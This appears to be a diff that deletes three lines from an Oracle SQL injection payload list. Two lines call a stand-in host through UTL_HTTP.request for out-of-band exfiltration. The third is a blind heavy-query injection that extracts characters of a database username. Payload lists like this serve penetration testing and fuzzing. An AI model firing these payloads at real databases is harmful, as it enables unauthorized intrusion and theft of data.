@@ -1,3 +1,0 @@
-' union Utl_Http.request(‘http://madeupserver.com’) --
-' 1=2 or Utl_Http.request(‘http://madeupserver.com’) --
-' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 AND 300 > ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1)) --
